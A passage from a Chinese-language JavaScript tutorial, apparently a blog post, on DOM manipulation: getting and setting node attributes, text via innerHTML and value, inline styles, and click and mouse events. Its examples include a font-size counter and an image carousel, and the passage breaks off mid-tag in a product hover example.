<li>不管节点（标签）在网页中嵌套关系如何让复杂，都可以通过这个方法获取到，即可以获取任意位置的标签</li>
<li>注：标签（节点）在 JS 当中属于引用类型数据</li>
</ul>
<h4 id="操作节点的属性"><a href="#操作节点的属性" class="headerlink" title="操作节点的属性"></a>操作节点的属性</h4><p>概述：我们可以通过 DOM 方法获取到节点树上的任意节点（标签），通过点语法来操作节点属性、文本和样式等</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;cn&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;box&quot;</span> <span class="attr">class</span>=<span class="string">&quot;cur&quot;</span>&gt;</span> hello <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 其中 id 和 class 是属性，hello 是文本 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> div=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;box&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// 获取节点 id 属性</span></span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">console</span>.<span class="title function_">log</span>(div.<span class="property">id</span>);</span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// 获取 class 属性需要用 className</span></span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">console</span>.<span class="title function_">log</span>(div.<span class="property">className</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 设置节点属性值</span></span></span><br><span class="line"><span class="language-javascript">    div.<span class="property">id</span>=<span class="string">&quot;nn&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;nn&quot;</span>));</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 输出 --&gt;</span></span><br><span class="line">box</span><br><span class="line">cur</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;nn&quot;</span> <span class="attr">class</span>=<span class="string">&quot;cur&quot;</span>&gt;</span> hello <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>可以通过 DOM 方法获取节点，进而操作节点属性</p>
</li>
<li><p>通过节点名字利用点语法（属性名字），可以获取节点某一个属性的属性值，也可以通过 JS 动态设置新的属性值</p>
</li>
<li><p><strong>class 属性值需要通过 className 获取</strong></p>
</li>
</ul>
<h4 id="操作节点文本"><a href="#操作节点文本" class="headerlink" title="操作节点文本"></a>操作节点文本</h4><p>概述：可以通过点语法操作节点的文本</p>
<p>注：操作节点本文有两种情况</p>
<ul>
<li><p>操作<strong>表单元素</strong>文本，需要通过 value 属性操作</p>
</li>
<li><p>操作<strong>非表单元素</strong>文本，需要通过 innerHTML 属性操作</p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;no1&quot;</span>&gt;</span> how are you <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;no2&quot;</span> <span class="attr">value</span>=<span class="string">&quot; first &quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// 操作非表单元素</span></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> p=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;no1&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// 获取文本</span></span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">console</span>.<span class="title function_">log</span>(p.<span class="property">innerHTML</span>);</span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// 修改文本</span></span></span><br><span class="line"><span class="language-javascript">	p.<span class="property">innerHTML</span>=<span class="string">&quot; 666 &quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;no1&quot;</span>));</span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// 操作表单元素</span></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> input_dom=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;no2&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// 获取文本</span></span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">console</span>.<span class="title function_">log</span>(input_dom.<span class="property">value</span>);</span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// 修改文本</span></span></span><br><span class="line"><span class="language-javascript">	input_dom.<span class="property">value</span>=<span class="string">&quot;second&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;no2&quot;</span>));</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 输出 --&gt;</span></span><br><span class="line"> how are you </span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;no1&quot;</span>&gt;</span> 666 <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">first </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;no2&quot;</span> <span class="attr">value</span>=<span class="string">&quot; second &quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>可以通过 Js 动态操作节点文本</p>
</li>
<li><p>表单元素需要通过 value 属性进行操作文本</p>
</li>
<li><p>非表单元素需要通过 innerHTML 属性操作文本</p>
</li>
</ul>
<h4 id="操作节点样式"><a href="#操作节点样式" class="headerlink" title="操作节点样式"></a>操作节点样式</h4><p>概述：可以利用 DOM 方法获取节点，操作节点行内样式</p>
<p>样式：层叠样式表，样式可以美化网页，可以让元素通过浮动、定位改变他们在网页中的位置</p>
<p>样式分为三种写法：行内样式、内部样式、外部样式</p>
<h5 id="行内样式"><a href="#行内样式" class="headerlink" title="行内样式"></a>行内样式</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">width:100px;height:100px;color:red;background-color:aquamarine</span>&gt;</span>你好哇<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="内部样式"><a href="#内部样式" class="headerlink" title="内部样式"></a>内部样式</h5><p>写在 head 里面，title 下面，可以使用标签筛选器，类筛选器等等，选择单个标签指定样式</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">	<span class="selector-class">.container</span>&#123;</span></span><br><span class="line"><span class="language-css">		<span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css">		<span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">		<span class="attribute">font-size</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">	&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="外部样式"><a href="#外部样式" class="headerlink" title="外部样式"></a>外部样式</h5><p>外链标签需要新建一个 css 文件，在文件中直接书写样式内容，通过 link 标签在需要使用的文件中引入 css</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;css1.css&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="实例-3"><a href="#实例-3" class="headerlink" title="实例"></a>实例</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;no1&quot;</span> <span class="attr">style</span>=<span class="string">color:red;</span>&gt;</span> how are you <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;no1&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// 获取行内样式</span></span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">console</span>.<span class="title function_">log</span>(div.<span class="property">style</span>);</span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">console</span>.<span class="title function_">log</span>(div.<span class="property">style</span>.<span class="property">color</span>);</span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// 设置行内样式</span></span></span><br><span class="line"><span class="language-javascript">	div.<span class="property">style</span>.<span class="property">color</span>=<span class="string">&quot;blue&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;no1&quot;</span>));</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 输出 --&gt;</span></span><br><span class="line">CSSStyleDeclaration</span><br><span class="line">red</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;no1&quot;</span> <span class="attr">style</span>=<span class="string">color:blue;</span>&gt;</span> how are you <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>在 JS 当中点语法操作的是行内样式</p>
</li>
<li><p>通过 JS代码可以获取和设置行内样式（设置时需要用字符串且部分需要带单位 px）</p>
</li>
<li><p>节点样式：background-color，font-size 等等（中间带有横线的），变为驼峰写法</p>
</li>
</ul>
<h4 id="事件绑定"><a href="#事件绑定" class="headerlink" title="事件绑定"></a>事件绑定</h4><p>概述：在网站中，用户经常用鼠标移上某个元素，单击某一元素，这个元素可以对用户这个行为进行响应。这种现象称为“事件绑定”，是人和机器的交互</p>
<p>注意：在 JS 中只有标签才可以绑定事件。数组、JSON、函数、变量、循环语句这些都不能绑定事件的。</p>
<p>语法格式：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">element.<span class="property">onxxxx</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>onxxxx：这些事件名字都是小写的</p>
</li>
<li><p>右侧部分是一个函数（事件处理函数）：当用户触发事件的时候才会执行一次</p>
</li>
</ul>
<h5 id="onclick-和-ondbclick"><a href="#onclick-和-ondbclick" class="headerlink" title="onclick 和 ondbclick"></a>onclick 和 ondbclick</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// 给元素绑定单击事件（双击事件只要换成 ondbclick 即可）</span></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> div=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;box&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">	div.<span class="property">onclick</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="comment">// 修改背景颜色</span></span></span><br><span class="line"><span class="language-javascript">		div.<span class="property">style</span>.<span class="property">backgroundColor</span>=<span class="string">&quot;red&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">		<span class="comment">// 修改文字大小</span></span></span><br><span class="line"><span class="language-javascript">		div.<span class="property">style</span>.<span class="property">fontSize</span>=<span class="string">&quot;40px&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>右侧函数（事件处理函数）：当用户触发事件的时候才会执行</p>
</li>
<li><p>可以给任意一个元素绑定单击事件，一般给非表单元素绑定事件</p>
</li>
</ul>
<h5 id="信号量思想"><a href="#信号量思想" class="headerlink" title="信号量思想"></a>信号量思想</h5><p>信号量：就是一个全局变量，可以左右程序的走向</p>
<p>例如：</p>
<ol>
<li>单击元素每单击一次字体大小增加 1，信号量即为 i</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// 获取节点</span></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> p=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;p&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// 声明一个全局变量为字号默认值 12px</span></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> i=<span class="number">12</span>;</span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// 绑定单击事件</span></span></span><br><span class="line"><span class="language-javascript">	p.<span class="property">onclick</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="comment">// 需要信号量雷加</span></span></span><br><span class="line"><span class="language-javascript">		i++;</span></span><br><span class="line"><span class="language-javascript">		<span class="comment">// 进行条件判断</span></span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">if</span>(i&gt;<span class="number">20</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			i=<span class="number">20</span>;</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">		<span class="comment">// 修改标签的字体大小</span></span></span><br><span class="line"><span class="language-javascript">		p.<span class="property">style</span>.<span class="property">fontSize</span>=i+<span class="string">&quot;px&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>轮播图</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">			*&#123;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">margin</span>:<span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">padding</span>:<span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">			&#125;</span></span><br><span class="line"><span class="language-css">			<span class="selector-tag">div</span>&#123;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">width</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">margin</span>:<span class="number">100px</span> auto;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">border</span>:<span class="number">1px</span> solid black;</span></span><br><span class="line"><span class="language-css">			&#125;</span></span><br><span class="line"><span class="language-css">			<span class="selector-tag">img</span>&#123;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">width</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">			&#125;</span></span><br><span class="line"><span class="language-css">			<span class="selector-id">#lbtn</span>&#123;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">width</span>: <span class="number">40px</span>;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">height</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">left</span>:<span class="number">0px</span>;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">top</span>:<span class="number">40%</span>;</span></span><br><span class="line"><span class="language-css">			&#125;</span></span><br><span class="line"><span class="language-css">			<span class="selector-id">#rbtn</span>&#123;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">width</span>: <span class="number">40px</span>;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">height</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">right</span>:<span class="number">0px</span>;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">top</span>:<span class="number">40%</span>;</span></span><br><span class="line"><span class="language-css">			&#125;</span></span><br><span class="line"><span class="language-css">		</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="comment">&lt;!-- &amp;lt为小于号,&amp;gt为大于号 --&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;lbtn&quot;</span>&gt;</span><span class="symbol">&amp;lt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">&quot;cur&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./0.jpeg&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;rbtn&quot;</span>&gt;</span><span class="symbol">&amp;gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">//获取节点</span></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> rbtn=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;rbtn&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> lbtn=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;lbtn&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">	<span class="comment">//获取图片节点</span></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> img=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;cur&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">	<span class="comment">//定义信号量</span></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> idx=<span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//绑定单击事件</span></span></span><br><span class="line"><span class="language-javascript">	rbtn.<span class="property">onclick</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		idx++;</span></span><br><span class="line"><span class="language-javascript">		idx=idx&gt;<span class="number">3</span> ? <span class="number">0</span>:idx;</span></span><br><span class="line"><span class="language-javascript">		img.<span class="property">src</span>=<span class="string">&quot;./&quot;</span> + idx +<span class="string">&quot;.jpeg&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">	lbtn.<span class="property">onclick</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		idx--;</span></span><br><span class="line"><span class="language-javascript">		idx=idx&lt;<span class="number">0</span> ? <span class="number">3</span>:idx;</span></span><br><span class="line"><span class="language-javascript">		img.<span class="property">src</span>=<span class="string">&quot;./&quot;</span> + idx +<span class="string">&quot;.jpeg&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="onmouseenter-和-onmouseleave"><a href="#onmouseenter-和-onmouseleave" class="headerlink" title="onmouseenter 和 onmouseleave"></a>onmouseenter 和 onmouseleave</h5><p>概述：任意节点，都可以给他们添加鼠标上移和移除事件</p>
<p>鼠标进入：onmouseenter 或 onmouseover</p>
<p>鼠标移除：onmouseleave 或 onmouseout</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// 获取节点</span></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> img=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;box&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// 绑定鼠标进入事件</span></span></span><br><span class="line"><span class="language-javascript">	img.<span class="property">onmouseenter</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		img.<span class="property">src</span>=<span class="string">&quot;./1.jpeg&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// 绑定鼠标移出事件</span></span></span><br><span class="line"><span class="language-javascript">	img.<span class="property">onmouseleave</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		img.<span class="property">src</span>=<span class="string">&quot;./0.jpeg&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="淘宝商品特效"><a href="#淘宝商品特效" class="headerlink" title="淘宝商品特效"></a>淘宝商品特效</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">			*&#123;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        	&#125;</span></span><br><span class="line"><span class="language-css">			<span class="selector-tag">div</span>&#123;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">width</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">border</span>: <span class="number">1px</span> solid blue;</span></span><br><span class="line"><span class="language-css">                <span class="comment">/* 一个宽度为1像素、颜色为蓝色的实线边框 */</span></span></span><br><span class="line"><span class="language-css">			&#125;</span></span><br><span class="line"><span class="language-css">			<span class="selector-tag">img</span>&#123;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">width</span>: <span class="number">300px</span> ;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">height</span>: <span class="number">150px</span>;</span></span><br><span class="line"><span class="language-css">			&#125;</span></span><br><span class="line"><span class="language-css">			<span class="selector-class">.money</span>&#123;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">font-size</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">			&#125;</span></span><br><span class="line"><span class="language-css">		</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;no1&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./0.jpeg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;money&quot;</span> <span class="attr">id</span>=<span class="string">&quot;cur&quot;</span>&gt;</span>$100000<span class="tag">&lt;/<span 